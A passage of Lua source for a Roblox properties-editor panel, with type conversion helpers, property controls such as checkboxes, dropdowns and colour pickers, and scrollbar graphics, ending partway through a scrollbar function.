local bindGetSelection = ExplorerFrame.GetSelection
local bindSelectionChanged = ExplorerFrame.SelectionChanged
local bindGetApi = PropertiesFrame.GetApi
local bindGetAwait = PropertiesFrame.GetAwaiting
local bindSetAwait = PropertiesFrame.SetAwaiting

local ContentUrl = ContentProvider.BaseUrl .. "asset/?id="

local SettingsRemote = Gui:WaitForChild("SettingsPanel"):WaitForChild("GetSetting")

local propertiesSearch = PropertiesFrame.Header.TextBox

local AwaitingObjectValue = false
local AwaitingObjectObj
local AwaitingObjectProp

function searchingProperties()
	if propertiesSearch.Text ~= "" and propertiesSearch.Text ~= "Search Properties" then
		return true
	end
	return false
end

local function GetSelection()
	local selection = bindGetSelection:Invoke()
	if #selection == 0 then
		return nil
	else
		return selection
	end 
end

-- Number

local function Round(number, decimalPlaces)
	return tonumber(string.format("%." .. (decimalPlaces or 0) .. "f", number))
end

-- Strings

local function Split(str, delimiter)
	local start = 1
	local t = {}
	while true do
		local pos = string.find (str, delimiter, start, true)
		if not pos then
			break
		end
		table.insert (t, string.sub (str, start, pos - 1))
		start = pos + string.len (delimiter)
	end
	table.insert (t, string.sub (str, start))
	return t
end

-- Data Type Handling

local function ToString(value, type)
	if type == "float" then
		return tostring(Round(value,2))
	elseif type == "Content" then
		if string.find(value,"/asset") then
			local match = string.find(value, "=") + 1
			local id = string.sub(value, match)
			return id
		else
			return tostring(value)
		end
	elseif type == "Vector2" then
		local x = value.x
		local y = value.y
		return string.format("%g, %g", x,y)
	elseif type == "Vector3" then
		local x = value.x
		local y = value.y
		local z = value.z
		return string.format("%g, %g, %g", x,y,z)
	elseif type == "Color3" then
		local r = value.r
		local g = value.g
		local b = value.b
		return string.format("%d, %d, %d", r*255,g*255,b*255)
	elseif type == "UDim2" then
		local xScale = value.X.Scale
		local xOffset = value.X.Offset
		local yScale = value.Y.Scale
		local yOffset = value.Y.Offset
		return string.format("{%d, %d}, {%d, %d}", xScale, xOffset, yScale, yOffset)
	else
		return tostring(value)
	end
end

local function ToValue(value,type)
	if type == "Vector2" then
		local list = Split(value,",")
		if #list < 2 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		return Vector2.new(x,y)
	elseif type == "Vector3" then
		local list = Split(value,",")
		if #list < 3 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		local z = tonumber(list[3]) or 0
		return Vector3.new(x,y,z)
	elseif type == "Color3" then
		local list = Split(value,",")
		if #list < 3 then return nil end
		local r = tonumber(list[1]) or 0
		local g = tonumber(list[2]) or 0
		local b = tonumber(list[3]) or 0
		return Color3.new(r/255,g/255, b/255)
	elseif type == "UDim2" then
		local list = Split(string.gsub(string.gsub(value, "{", ""),"}",""),",")
		if #list < 4 then return nil end
		local xScale = tonumber(list[1]) or 0
		local xOffset = tonumber(list[2]) or 0
		local yScale = tonumber(list[3]) or 0
		local yOffset = tonumber(list[4]) or 0
		return UDim2.new(xScale, xOffset, yScale, yOffset)
	elseif type == "Content" then
		if tonumber(value) ~= nil then
			value = ContentUrl .. value
		end
		return value
	elseif type == "float" or type == "int" or type == "double" then
		return tonumber(value)
	elseif type == "string" then
		return value
	elseif type == "NumberRange" then
		local list = Split(value,",")
		if #list == 1 then
			if tonumber(list[1]) == nil then return nil end
			local newVal = tonumber(list[1]) or 0
			return NumberRange.new(newVal)
		end
		if #list < 2 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		return NumberRange.new(x,y)
	else
		return nil
	end
end


-- Tables

local function CopyTable(T)
  local t2 = {}
  for k,v in pairs(T) do
    t2[k] = v
  end
  return t2
end

local function SortTable(T)
	table.sort(T, 
		function(x,y) return x.Name < y.Name
	end)
end

-- Spritesheet
local Sprite = {
	Width = 13;
	Height = 13;
}

local Spritesheet = {
	Image = "http://www.roblox.com/asset/?id=128896947";
	Height = 256;
	Width = 256;
}

local Images = {
	"unchecked",
	"checked",
	"unchecked_over",
	"checked_over",
	"unchecked_disabled",
	"checked_disabled"
}

local function SpritePosition(spriteName)
	local x = 0
	local y = 0
	for i,v in pairs(Images) do
		if (v == spriteName) then
			return {x, y}
		end
		x = x + Sprite.Height
		if (x + Sprite.Width) > Spritesheet.Width then
			x = 0
			y = y + Sprite.Height
		end
	end
end

local function GetCheckboxImageName(checked, readOnly, mouseover)
	if checked then
		if readOnly then
			return "checked_disabled"
		elseif mouseover then
			return "checked_over"
		else
			return "checked"
		end
	else
		if readOnly then
			return "unchecked_disabled"
		elseif mouseover then
			return "unchecked_over"
		else
			return "unchecked"
		end
	end
end

local MAP_ID = 418720155

-- Gui Controls --

---- IconMap ----
-- Image size: 256px x 256px
-- Icon size: 16px x 16px
-- Padding between each icon: 2px
-- Padding around image edge: 1px
-- Total icons: 14 x 14 (196)
local Icon do
	local iconMap = 'http://www.roblox.com/asset/?id=' .. MAP_ID
	game:GetService('ContentProvider'):Preload(iconMap)
	local iconDehash do
		-- 14 x 14, 0-based input, 0-based output
		local f=math.floor
		function iconDehash(h)
			return f(h/14%14),f(h%14)
		end
	end

	function Icon(IconFrame,index)
		local row,col = iconDehash(index)
		local mapSize = Vector2.new(256,256)
		local pad,border = 2,1
		local iconSize = 16

		local class = 'Frame'
		if type(IconFrame) == 'string' then
			class = IconFrame
			IconFrame = nil
		end

		if not IconFrame then
			IconFrame = Create(class,{
				Name = "Icon";
				BackgroundTransparency = 1;
				ClipsDescendants = true;
				Create('ImageLabel',{
					Name = "IconMap";
					Active = false;
					BackgroundTransparency = 1;
					Image = iconMap;
					Size = UDim2.new(mapSize.x/iconSize,0,mapSize.y/iconSize,0);
				});
			})
		end

		IconFrame.IconMap.Position = UDim2.new(-col - (pad*(col+1) + border)/iconSize,0,-row - (pad*(row+1) + border)/iconSize,0)
		return IconFrame
	end
end

local function CreateCell()
	local tableCell = Instance.new("Frame")
	tableCell.Size = UDim2.new(0.5, -1, 1, 0)
	tableCell.BackgroundColor3 = Row.BackgroundColor
	tableCell.BorderColor3 = Row.BorderColor
	return tableCell
end
	
local function CreateLabel(readOnly)
	local label = Instance.new("TextLabel")
	label.Font = Row.Font
	label.FontSize = Row.FontSize
	label.TextXAlignment = Row.TextXAlignment
	label.BackgroundTransparency = 1
	
	if readOnly then
		label.TextColor3 = Row.TextLockedColor
	else
		label.TextColor3 = Row.TextColor
	end
	return label
end

local function CreateTextButton(readOnly, onClick)
	local button = Instance.new("TextButton")
	button.Font = Row.Font
	button.FontSize = Row.FontSize
	button.TextXAlignment = Row.TextXAlignment
	button.BackgroundTransparency = 1
	if readOnly then
		button.TextColor3 = Row.TextLockedColor
	else
		button.TextColor3 = Row.TextColor
		button.MouseButton1Click:connect(function()
			onClick()
		end)
	end
	return button
end

local function CreateObject(readOnly)
	local button = Instance.new("TextButton")
	button.Font = Row.Font
	button.FontSize = Row.FontSize
	button.TextXAlignment = Row.TextXAlignment
	button.BackgroundTransparency = 1
	if readOnly then
		button.TextColor3 = Row.TextLockedColor
	else
		button.TextColor3 = Row.TextColor
	end
	local cancel = Create(Icon('ImageButton',177),{
		Name = "Cancel";
		Visible = false;
		Position = UDim2.new(1,-20,0,0);
		Size = UDim2.new(0,20,0,20);
		Parent = button;
	})
	return button
end

local function CreateTextBox(readOnly)
	if readOnly then
		local box = CreateLabel(readOnly)
		return box
	else
		local box = Instance.new("TextBox")
		if not SettingsRemote:Invoke("ClearProps") then
			box.ClearTextOnFocus = false
		end
		box.Font = Row.Font
		box.FontSize = Row.FontSize
		box.TextXAlignment = Row.TextXAlignment
		box.BackgroundTransparency = 1
		box.TextColor3 = Row.TextColor
		return box
	end
end

local function CreateDropDownItem(text, onClick)
	local button = Instance.new("TextButton")
	button.Font = DropDown.Font
	button.FontSize = DropDown.FontSize
	button.TextColor3 = DropDown.TextColor
	button.TextXAlignment = DropDown.TextXAlignment
	button.BackgroundColor3 = DropDown.BackColor
	button.AutoButtonColor = false
	button.BorderSizePixel = 0
	button.Active = true
	button.Text = text
	
	button.MouseEnter:connect(function()
		button.TextColor3 = DropDown.TextColorOver
		button.BackgroundColor3 = DropDown.BackColorOver
	end)
	button.MouseLeave:connect(function()
		button.TextColor3 = DropDown.TextColor
		button.BackgroundColor3 = DropDown.BackColor
	end)
	button.MouseButton1Click:connect(function()
		onClick(text)
	end)	
	return button
end

local function CreateDropDown(choices, currentChoice, readOnly, onClick)
	local frame = Instance.new("Frame")	
	frame.Name = "DropDown"
	frame.Size = UDim2.new(1, 0, 1, 0)
	frame.BackgroundTransparency = 1
	frame.Active = true
	
	local menu = nil
	local arrow = nil
	local expanded = false
	local margin = DropDown.BorderSizePixel;
	
	local button = Instance.new("TextButton")
	button.Font = Row.Font
	button.FontSize = Row.FontSize
	button.TextXAlignment = Row.TextXAlignment
	button.BackgroundTransparency = 1
	button.TextColor3 = Row.TextColor
	if readOnly then
		button.TextColor3 = Row.TextLockedColor
	end
	button.Text = currentChoice
	button.Size = UDim2.new(1, -2 * Styles.Margin, 1, 0)
	button.Position = UDim2.new(0, Styles.Margin, 0, 0)
	button.Parent = frame
	
	local function showArrow(color)
		if arrow then arrow:Destroy() end
		
		local graphicTemplate = Create('Frame',{
			Name="Graphic";
			BorderSizePixel = 0;
			BackgroundColor3 = color;
		})
		local graphicSize = 16/2
		
		arrow = ArrowGraphic(graphicSize,'Down',true,graphicTemplate)
		arrow.Position = UDim2.new(1,-graphicSize * 2,0.5,-graphicSize/2)
		arrow.Parent = frame
	end
	
	local function hideMenu()
		expanded = false
		showArrow(DropDown.ArrowColor)
		if menu then menu:Destroy() end
	end
	
	local function showMenu()
		expanded = true
		menu = Instance.new("Frame")
		menu.Size = UDim2.new(1, -2 * margin, 0, #choices * DropDown.Height)
		menu.Position = UDim2.new(0, margin, 0, Row.Height + margin)
		menu.BackgroundTransparency = 0
		menu.BackgroundColor3 = DropDown.BackColor
		menu.BorderColor3 = DropDown.BorderColor
		menu.BorderSizePixel = DropDown.BorderSizePixel
		menu.Active = true
		menu.ZIndex = 5
		menu.Parent = frame
		
		local parentFrameHeight = menu.Parent.Parent.Parent.Parent.Size.Y.Offset
		local rowHeight = menu.Parent.Parent.Parent.Position.Y.Offset
		if (rowHeight + menu.Size.Y.Offset) > math.max(parentFrameHeight,PropertiesFrame.AbsoluteSize.y) then
			menu.Position = UDim2.new(0, margin, 0, -1 * (#choices * DropDown.Height) - margin)
		end
			
		local function choice(name)
			onClick(name)
			hideMenu()
		end
		
		for i,name in pairs(choices) do
			local option = CreateDropDownItem(name, function()
				choice(name)
			end)
			option.Size = UDim2.new(1, 0, 0, 16)
			option.Position = UDim2.new(0, 0, 0, (i - 1) * DropDown.Height)
			option.ZIndex = menu.ZIndex
			option.Parent = menu
		end
	end
	
	showArrow(DropDown.ArrowColor)
	
	if not readOnly then
		
		button.MouseEnter:connect(function()
			button.TextColor3 = Row.TextColor
			showArrow(DropDown.ArrowColorOver)
		end)
		button.MouseLeave:connect(function()
			button.TextColor3 = Row.TextColor
			if not expanded then
				showArrow(DropDown.ArrowColor)
			end
		end)
		button.MouseButton1Click:connect(function()
			if expanded then
				hideMenu()
			else
				showMenu()
			end
		end)
	end
	
	return frame,button
end

local function CreateBrickColor(readOnly, onClick)
	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(1,0,1,0)
	frame.BackgroundTransparency = 1
	
	local colorPalette = Instance.new("Frame")
	colorPalette.BackgroundTransparency = 0
	colorPalette.SizeConstraint = Enum.SizeConstraint.RelativeXX
	colorPalette.Size = UDim2.new(1, -2 * BrickColors.OuterBorder, 1, -2 * BrickColors.OuterBorder)
	colorPalette.BorderSizePixel = BrickColors.BorderSizePixel
	colorPalette.BorderColor3 = BrickColors.BorderColor
	colorPalette.Position = UDim2.new(0, BrickColors.OuterBorder, 0, BrickColors.OuterBorder + Row.Height)
	colorPalette.ZIndex = 5
	colorPalette.Visible = false
	colorPalette.BorderSizePixel = BrickColors.OuterBorder
	colorPalette.BorderColor3 = BrickColors.OuterBorderColor
	colorPalette.Parent = frame
	
	local function show()
		colorPalette.Visible = true
	end
	
	local function hide()
		colorPalette.Visible = false
	end
	
	local function toggle()
		colorPalette.Visible = not colorPalette.Visible
	end
	
	local colorBox = Instance.new("TextButton", frame)
	colorBox.Position = UDim2.new(0, Styles.Margin, 0, Styles.Margin)
	colorBox.Size = UDim2.new(0, BrickColors.BoxSize, 0, BrickColors.BoxSize)
	colorBox.Text = ""
	colorBox.MouseButton1Click:connect(function()
		if not readOnly then
			toggle()
		end
	end)
	
	if readOnly then
		colorBox.AutoButtonColor = false
	end
	
	local spacingBefore = (Styles.Margin * 2) + BrickColors.BoxSize
	
	local propertyLabel = CreateTextButton(readOnly, function()
		if not readOnly then
			toggle()
		end
	end)
	propertyLabel.Size = UDim2.new(1, (-1 * spacingBefore) - Styles.Margin, 1, 0)
	propertyLabel.Position = UDim2.new(0, spacingBefore, 0, 0)
	propertyLabel.Parent = frame
	
	local size = (1 / BrickColors.ColorsPerRow)
	
	for index = 0, 127 do
		local brickColor = BrickColor.palette(index)
		local color3 = brickColor.Color
		
		local x = size * (index % BrickColors.ColorsPerRow)
		local y = size * math.floor(index / BrickColors.ColorsPerRow)
	
		local brickColorBox = Instance.new("TextButton")
		brickColorBox.Text = ""
		brickColorBox.Size = UDim2.new(size,0,size,0)
		brickColorBox.BackgroundColor3 = color3
		brickColorBox.Position = UDim2.new(x, 0, y, 0)
		brickColorBox.ZIndex = colorPalette.ZIndex
		brickColorBox.Parent = colorPalette
	
		brickColorBox.MouseButton1Click:connect(function()
			hide()
			onClick(brickColor)
		end)
	end
	
	return frame,propertyLabel,colorBox
end

local function CreateColor3Control(readOnly, onClick)
	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(1,0,1,0)
	frame.BackgroundTransparency = 1
	
	local colorBox = Instance.new("TextButton", frame)
	colorBox.Position = UDim2.new(0, Styles.Margin, 0, Styles.Margin)
	colorBox.Size = UDim2.new(0, BrickColors.BoxSize, 0, BrickColors.BoxSize)
	colorBox.Text = ""
	colorBox.AutoButtonColor = false
	
	local spacingBefore = (Styles.Margin * 2) + BrickColors.BoxSize
	local box = CreateTextBox(readOnly)
	box.Size = UDim2.new(1, (-1 * spacingBefore) - Styles.Margin, 1, 0)
	box.Position = UDim2.new(0, spacingBefore, 0, 0)
	box.Parent = frame
	
	return frame,box,colorBox
end

function CreateCheckbox(value, readOnly, onClick)
	local checked = value
	local mouseover = false

	local checkboxFrame = Instance.new("ImageButton")
	checkboxFrame.Size = UDim2.new(0, Sprite.Width, 0, Sprite.Height)
	checkboxFrame.BackgroundTransparency = 1
	checkboxFrame.ClipsDescendants = true
	--checkboxFrame.Position = UDim2.new(0, Styles.Margin, 0, Styles.Margin)

	local spritesheetImage = Instance.new("ImageLabel", checkboxFrame)
	spritesheetImage.Name = "SpritesheetImageLabel"
	spritesheetImage.Size = UDim2.new(0, Spritesheet.Width, 0, Spritesheet.Height)
	spritesheetImage.Image = Spritesheet.Image
	spritesheetImage.BackgroundTransparency = 1
	
	local function updateSprite()
		local spriteName = GetCheckboxImageName(checked, readOnly, mouseover)
		local spritePosition = SpritePosition(spriteName)
		spritesheetImage.Position = UDim2.new(0, -1 * spritePosition[1], 0, -1 * spritePosition[2])
	end
	
	local function setValue(val)
		checked = val
		updateSprite()
	end

	if not readOnly then
		checkboxFrame.MouseEnter:connect(function() mouseover = true updateSprite() end)
		checkboxFrame.MouseLeave:connect(function() mouseover = false updateSprite() end)
		checkboxFrame.MouseButton1Click:connect(function()
			onClick(checked)
		end)
	end
	
	updateSprite()
	
	return checkboxFrame, setValue
end



-- Code for handling controls of various data types --

local Controls = {}

Controls["default"] = function(object, propertyData, readOnly)
	local propertyName = propertyData["Name"]
	local propertyType = propertyData["ValueType"]
	
	local box = CreateTextBox(readOnly)
	box.Size = UDim2.new(1, -2 * Styles.Margin, 1, 0)
	box.Position = UDim2.new(0, Styles.Margin, 0, 0)

	local function update()
		local value = object[propertyName]
		box.Text = ToString(value, propertyType)
	end
	
	if not readOnly then
		box.FocusLost:connect(function(enterPressed)
			Set(object, propertyData, ToValue(box.Text,propertyType))
			update()
		end)
	end
	
	update()
	
	object.Changed:connect(function(property)
		if (property == propertyName) then
			update()
		end
	end)
	
	return box
end

Controls["bool"] = function(object, propertyData, readOnly)
	local propertyName = propertyData["Name"]
	local checked = object[propertyName]
	
	local checkbox, setValue = CreateCheckbox(checked, readOnly, function(value)
		Set(object, propertyData, not checked)
	end)
	checkbox.Position = UDim2.new(0, Styles.Margin, 0, Styles.Margin)
	
	setValue(checked)
	
	local function update()
		checked = object[propertyName]
		setValue(checked)
	end
	
	object.Changed:connect(function(property)
		if (property == propertyName) then
			update()
		end
	end)
	
	if object:IsA("BoolValue") then
		object.Changed:connect(function(val)
			update()
		end)
	end
	
	update()
	
	return checkbox
end

Controls["BrickColor"] = function(object, propertyData, readOnly)
	local propertyName = propertyData["Name"]

	local frame,label,brickColorBox = CreateBrickColor(readOnly, function(brickColor)
		Set(object, propertyData, brickColor)
	end)
	
	local function update()
		local value = object[propertyName]
		brickColorBox.BackgroundColor3 = value.Color
		label.Text = tostring(value)
	end
	
	update()
	
	object.Changed:connect(function(property)
		if (property == propertyName) then
			update()
		end
	end)
	
	return frame
end

Controls["Color3"] = function(object, propertyData, readOnly)
	local propertyName = propertyData["Name"]

	local frame,textBox,colorBox = CreateColor3Control(readOnly)
	
	textBox.FocusLost:connect(function(enterPressed)
		Set(object, propertyData, ToValue(textBox.Text,"Color3"))
		local value = object[propertyName]
		colorBox.BackgroundColor3 = value
		textBox.Text = ToString(value, "Color3")
	end)
			
	local function update()
		local value = object[propertyName]
		colorBox.BackgroundColor3 = value
		textBox.Text = ToString(value, "Color3")
	end
	
	update()
	
	object.Changed:connect(function(property)
		if (property == propertyName) then
			update()
		end
	end)
	
	return frame
end

Controls["Enum"] = function(object, propertyData, readOnly)
	local propertyName = propertyData["Name"]
	local propertyType = propertyData["ValueType"]
	
	local enumName = object[propertyName].Name
	
	local enumNames = {}
	for _,enum in pairs(Enum[tostring(propertyType)]:GetEnumItems()) do
		table.insert(enumNames, enum.Name)
	end
	
	local dropdown, propertyLabel = CreateDropDown(enumNames, enumName, readOnly, function(value)
		Set(object, propertyData, value)
	end)
	--dropdown.Parent = frame
	
	local function update()
		local value = object[propertyName].Name
		propertyLabel.Text = tostring(value)
	end
	
	update()
	
	object.Changed:connect(function(property)
		if (property == propertyName) then
			update()
		end
	end)
	
	return dropdown
end

Controls["Object"] = function(object, propertyData, readOnly)
	local propertyName = propertyData["Name"]
	local propertyType = propertyData["ValueType"]
	
	local box = CreateObject(readOnly,function()end)
	box.Size = UDim2.new(1, -2 * Styles.Margin, 1, 0)
	box.Position = UDim2.new(0, Styles.Margin, 0, 0)

	local function update()
		if AwaitingObjectObj == object then
			if AwaitingObjectValue == true then
				box.Text = "Select an Object"
				return
			end
		end
		local value = object[propertyName]
		box.Text = ToString(value, propertyType)
	end
	
	if not readOnly then
		box.MouseButton1Click:connect(function()
			if AwaitingObjectValue then
				AwaitingObjectValue = false
				update()
				return
			end
			AwaitingObjectValue = true
			AwaitingObjectObj = object
			AwaitingObjectProp = propertyData
			box.Text = "Select an Object"
		end)
		
		box.Cancel.Visible = true
		box.Cancel.MouseButton1Click:connect(function()
			object[propertyName] = nil
		end)
	end
	
	update()
	
	object.Changed:connect(function(property)
		if (property == propertyName) then
			update()
		end
	end)
	
	if object:IsA("ObjectValue") then
		object.Changed:connect(function(val)
			update()
		end)
	end
	
	return box
end

function GetControl(object, propertyData, readOnly)
	local propertyType = propertyData["ValueType"]
	local control = nil
	
	if Controls[propertyType] then
		control = Controls[propertyType](object, propertyData, readOnly)
	elseif RbxApi.IsEnum(propertyType) then
		control = Controls["Enum"](object, propertyData, readOnly)
	else
		control = Controls["default"](object, propertyData, readOnly)
	end
	return control
end
-- Permissions

function CanEditObject(object)
	local player = Players.LocalPlayer
	local character = player.Character
	return Permissions.CanEdit
end

function CanEditProperty(object,propertyData)
	local tags = propertyData["tags"]
	for _,name in pairs(tags) do
		if name == "readonly" then
			return false
		end
	end
	return CanEditObject(object)
end

--RbxApi
local function PropertyIsHidden(propertyData)
	local tags = propertyData["tags"]
	for _,name in pairs(tags) do
		if name == "deprecated"
			or name == "hidden"
			or name == "writeonly" then
			return true
		end
	end
	return false
end

function Set(object, propertyData, value)
	local propertyName = propertyData["Name"]
	local propertyType = propertyData["ValueType"]
	
	if value == nil then return end
	
	for i,v in pairs(GetSelection()) do
		if CanEditProperty(v,propertyData) then
			pcall(function()
				--print("Setting " .. propertyName .. " to " .. tostring(value))
				v[propertyName] = value
			end)
		end
	end
end

function CreateRow(object, propertyData, isAlternateRow)
	local propertyName = propertyData["Name"]
	local propertyType = propertyData["ValueType"]
	local propertyValue = object[propertyName]
	--rowValue, rowValueType, isAlternate
	local backColor = Row.BackgroundColor;
	if (isAlternateRow) then
		backColor = Row.BackgroundColorAlternate
	end
	
	local readOnly = not CanEditProperty(object, propertyData)
	if propertyType == "Instance" or propertyName == "Parent" then readOnly = true end

	local rowFrame = Instance.new("Frame")
	rowFrame.Size = UDim2.new(1,0,0,Row.Height)
	rowFrame.BackgroundTransparency = 1
	rowFrame.Name = 'Row'

	local propertyLabelFrame = CreateCell()
	propertyLabelFrame.Parent = rowFrame
	propertyLabelFrame.ClipsDescendants = true
	
	local propertyLabel = CreateLabel(readOnly)
	propertyLabel.Text = propertyName
	propertyLabel.Size = UDim2.new(1, -1 * Row.TitleMarginLeft, 1, 0)
	propertyLabel.Position = UDim2.new(0, Row.TitleMarginLeft, 0, 0)
	propertyLabel.Parent = propertyLabelFrame

	local propertyValueFrame = CreateCell()
	propertyValueFrame.Size = UDim2.new(0.5, -1, 1, 0)
	propertyValueFrame.Position = UDim2.new(0.5, 0, 0, 0)
	propertyValueFrame.Parent = rowFrame

	local control = GetControl(object, propertyData, readOnly)
	control.Parent = propertyValueFrame

	rowFrame.MouseEnter:connect(function()
		propertyLabelFrame.BackgroundColor3 = Row.BackgroundColorMouseover
		propertyValueFrame.BackgroundColor3 = Row.BackgroundColorMouseover
	end)
	rowFrame.MouseLeave:connect(function()
		propertyLabelFrame.BackgroundColor3 = backColor
		propertyValueFrame.BackgroundColor3 = backColor
	end)
	
	propertyLabelFrame.BackgroundColor3 = backColor
	propertyValueFrame.BackgroundColor3 = backColor
	
	return rowFrame
end

function ClearPropertiesList()
	for _,instance in pairs(ContentFrame:GetChildren()) do
		instance:Destroy()
	end
end

local selection = Gui:FindFirstChild("Selection", 1)
print(selection)

function displayProperties(props)
	for i,v in pairs(props) do
		pcall(function()
			local a = CreateRow(v.object, v.propertyData, ((numRows % 2) == 0))
			a.Position = UDim2.new(0,0,0,numRows*Row.Height)
			a.Parent = ContentFrame
			numRows = numRows + 1
		end)
	end
end

function checkForDupe(prop,props)
	for i,v in pairs(props) do
		if v.propertyData.Name == prop.Name and v.propertyData.ValueType == prop.ValueType then
			return true
		end
	end
	return false
end

function sortProps(t)
	table.sort(t, 
		function(x,y) return x.propertyData.Name < y.propertyData.Name
	end)
end

function showProperties(obj)
	ClearPropertiesList()
	if obj == nil then return end
	local propHolder = {}
	local foundProps = {}
	numRows = 0
	for _,nextObj in pairs(obj) do
		if not foundProps[nextObj.className] then
			foundProps[nextObj.className] = true
			for i,v in pairs(RbxApi.GetProperties(nextObj.className)) do
				local suc, err = pcall(function()
					if not (PropertyIsHidden(v)) and not checkForDupe(v,propHolder) then
						if string.find(string.lower(v.Name),string.lower(propertiesSearch.Text)) or not searchingProperties() then
							table.insert(propHolder,{propertyData = v, object = nextObj})
						end
					end
				end)
				--[[if not suc then 
					warn("Problem getting the value of property " .. v.Name .. " | " .. err)
				end	--]]
			end
		end
	end
	sortProps(propHolder)
	displayProperties(propHolder)
	ContentFrame.Size = UDim2.new(1, 0, 0, numRows * Row.Height)
	scrollBar.ScrollIndex = 0
	scrollBar.TotalSpace = numRows * Row.Height
	scrollBar.Update()
end

----------------------------------------------------------------
-----------------------SCROLLBAR STUFF--------------------------
----------------------------------------------------------------
----------------------------------------------------------------
local ScrollBarWidth = 16

local ScrollStyles = {
	Background      = Color3.new(233/255, 233/255, 233/255);
	Border          = Color3.new(149/255, 149/255, 149/255);
	Selected        = Color3.new( 63/255, 119/255, 189/255);
	BorderSelected  = Color3.new( 55/255, 106/255, 167/255);
	Text            = Color3.new(  0/255,   0/255,   0/255);
	TextDisabled    = Color3.new(128/255, 128/255, 128/255);
	TextSelected    = Color3.new(255/255, 255/255, 255/255);
	Button          = Color3.new(221/255, 221/255, 221/255);
	ButtonBorder    = Color3.new(149/255, 149/255, 149/255);
	ButtonSelected  = Color3.new(255/255,   0/255,   0/255);
	Field           = Color3.new(255/255, 255/255, 255/255);
	FieldBorder     = Color3.new(191/255, 191/255, 191/255);
	TitleBackground = Color3.new(178/255, 178/255, 178/255);
}
do
	local ZIndexLock = {}
	function SetZIndex(object,z)
		if not ZIndexLock[object] then
			ZIndexLock[object] = true
			if object:IsA'GuiObject' then
				object.ZIndex = z
			end
			local children = object:GetChildren()
			for i = 1,#children do
				SetZIndex(children[i],z)
			end
			ZIndexLock[object] = nil
		end
	end
end
function SetZIndexOnChanged(object)
	return object.Changed:connect(function(p)
		if p == "ZIndex" then
			SetZIndex(object,object.ZIndex)
		end
	end)
end
function Create(ty,data)
	local obj
	if type(ty) == 'string' then
		obj = Instance.new(ty)
	else
		obj = ty
	end
	for k, v in pairs(data) do
		if type(k) == 'number' then
			v.Parent = obj
		else
			obj[k] = v
		end
	end
	return obj
end
-- returns the ascendant ScreenGui of an object
function GetScreen(screen)
	if screen == nil then return nil end
	while not screen:IsA("ScreenGui") do
		screen = screen.Parent
		if screen == nil then return nil end
	end
	return screen
end
-- AutoButtonColor doesn't always reset properly
function ResetButtonColor(button)
	local active = button.Active
	button.Active = not active
	button.Active = active
end

function ArrowGraphic(size,dir,scaled,template)
	local Frame = Create('Frame',{
		Name = "Arrow Graphic";
		BorderSizePixel = 0;
		Size = UDim2.new(0,size,0,size);
		Transparency = 1;
	})
	if not template then
		template = Instance.new("Frame")
		template.BorderSizePixel = 0
	end

	local transform
	if dir == nil or dir == 'Up' then
		function transform(p,s) return p,s end
	elseif dir == 'Down' then
		function transform(p,s) return UDim2.new(0,p.X.Offset,0,size-p.Y.Offset-1),s end
	elseif dir == 'Left' then
		function transform(p,s) return UDim2.new(0,p.Y.Offset,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
	elseif dir == 'Right' then
		function transform(p,s) return UDim2.new(0,size-p.Y.Offset-1,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
	end

	local scale
	if scaled then
		function scale(p,s) return UDim2.new(p.X.Offset/size,0,p.Y.Offset/size,0),UDim2.new(s.X.Offset/size,0,s.Y.Offset/size,0) end
	else
		function scale(p,s) return p,s end
	end

	local o = math.floor(size/4)
	if size%2 == 0 then
		local n = size/2-1
		for i = 0,n do
			local t = template:Clone()
			local p,s = scale(transform(
				UDim2.new(0,n-i,0,o+i),
				UDim2.new(0,(i+1)*2,0,1)
			))
			t.Position = p
			t.Size = s
			t.Parent = Frame
		end
	else
		local n = (size-1)/2
		for i = 0,n do
			local t = template:Clone()
			local p,s = scale(transform(
				UDim2.new(0,n-i,0,o+i),
				UDim2.new(0,i*2+1,0,1)
			))
			t.Position = p
			t.Size = s
			t.Parent = Frame
		end
	end
	if size%4 > 1 then
		local t = template:Clone()
		local p,s = scale(transform(
			UDim2.new(0,0,0,size-o-1),
			UDim2.new(0,size,0,1)
		))
		t.Position = p
		t.Size = s
		t.Parent = Frame
	end
	return Frame
end

function GripGraphic(size,dir,spacing,scaled,template)
	local Frame = Create('Frame',{
		Name = "Grip Graphic";
		BorderSizePixel = 0;
		Size = UDim2.new(0,size.x,0,size.y);
		Transparency = 1;
	})
	if not template then
		template = Instance.new("Frame")
		template.BorderSizePixel = 0
	end

	spacing = spacing or 2

	local scale
	if scaled then
		function scale(p) return UDim2.new(p.X.Offset/size.x,0,p.Y.Offset/size.y,0) end
	else
		function scale(p) return p end
	end

	if dir == 'Vertical' then
		for i=0,size.x-1,spacing do
			local t = template:Clone()
			t.Size = scale(UDim2.new(0,1,0,size.y))
			t.Position = scale(UDim2.new(0,i,0,0))
			t.Parent = Frame
		end
	elseif dir == nil or dir == 'Horizontal' then
		for i=0,size.y-1,spacing do
			local t = template:Clone()
			t.Size = scale(UDim2.new(0,size.x,0,1))
			t.Position = scale(UDim2.new(0,0,0,i))
			t.Parent = Frame
		end
	end

	return Frame
end

do
	local mt = {
		__index = {
			GetScrollPercent = function(self)
				return self.ScrollIndex/(self.TotalSpace-self.VisibleSpace)
			end;
			CanScrollDown = function(self)
				return self.ScrollIndex + self.VisibleSpace < self.TotalSpace
			end;
			CanScrollUp = function(self)
				return self.ScrollIndex > 0
			end;
			ScrollDown = function(self)
				self.ScrollIndex = self.ScrollIndex + self.PageIncrement
				self:Update()
			end;
			ScrollUp = function(self)
				self.ScrollIndex = self.ScrollIndex - self.PageIncrement
				self:Update()
			end;
			ScrollTo = function(self,index)
				self.ScrollIndex = index
				self:Update()
			end;
			SetScrollPercent = function(self,percent)
				self.ScrollIndex = math.floor((self.TotalSpace - self.VisibleSpace)*percent + 0.5)
				self:Update()
			end;
		};
	}
	mt.__index.CanScrollRight = mt.__index.CanScrollDown
	mt.__index.CanScrollLeft = mt.__index.CanScrollUp
	mt.__index.ScrollLeft = mt.__index.ScrollUp
	mt.__index.ScrollRight = mt.__index.ScrollDown

	function ScrollBar(horizontal)
		-- create row scroll bar
		local ScrollFrame = Create('Frame',{
			Name = "ScrollFrame";
